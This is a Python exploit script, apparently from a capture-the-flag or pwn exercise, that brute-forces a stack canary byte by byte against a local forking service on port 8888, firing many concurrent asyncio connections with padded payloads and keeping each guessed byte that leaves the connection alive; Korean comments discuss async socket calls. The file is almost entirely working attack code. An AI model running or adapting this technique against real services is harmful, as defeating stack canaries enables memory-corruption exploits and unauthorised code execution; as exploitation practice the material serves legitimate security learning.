#-*-coding: utf-8-*-
import asyncio
import socket
from struct import pack, unpack
from pprint import pprint
from timeout import timeout

##########################################
def u32(x):
    return unpack('<L', x)[0]
    
def p32(x):
    return pack('<L', x)

def p8(x):
    return pack('B', x)

async def recvuntil(self, s, delim):
    res = b''

    while True:
        receive = await self.sock_recv(s, 4096)
        if receive == 0:
            print("[recvuntil] receive EOF")
            return res
        else:
            res += receive
            
        offset = res.find(delim)
        if offset != -1:
            return res[:offset+len(delim)]
asyncio.AbstractEventLoop.recvuntil = recvuntil

###########################################


HOST = "127.0.0.1"
PORT = 8888

canary = [0 for i in range(4)]


async def break_canary(i, x):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(False)        ### MUST DO!!!!!
    
    await loop.sock_connect(s, ("127.0.0.1", 8888))
    
    try:
        await asyncio.wait_for(loop.recvuntil(s, b">"), timeout=5)
    except:
        print('">" timeout    x : {}'.format(hex(x)))
        return -1
    
    # await loop.sock_sendall(s, b'4') -> 굳이 await 코루틴을 쓸 이유가 없는 듯.
    # 근데 비동기 함수에 await안쓰면 Future 객체를 반환해서 사용할 수 없음.
    # 따라서 그냥 sock.sendall() 사용해야함.
    s.sendall(b'4') 
    await loop.recvuntil(s, b"(y/n) ")
    
    payload = b'1'*0xa
    for j in range(i):
        payload += p8(canary[j])
    payload += p8(x)
    
    await loop.sock_sendall(s, payload)
    is_alive = await loop.sock_recv(s, 4096)
    if len(is_alive) != 0:
        print("{} is {} th byte".format(hex(x), i))
        canary[i] = x
        return 1
    
    s.close()
    return 0



async def comain():
    range_pack = [range(0x80), range(0x80, 0x100)]
    for i in range(1, 4):
        for ran in range_pack:
            fts = [asyncio.ensure_future(break_canary(i, x)) for x in ran]
            for f in asyncio.as_completed(fts):
                await f
            if canary[i] != 0:
                break
                
        
if __name__=="__main__":
    global loop
    loop = asyncio.get_event_loop()
    loop.run_until_complete(comain())
    loop.close()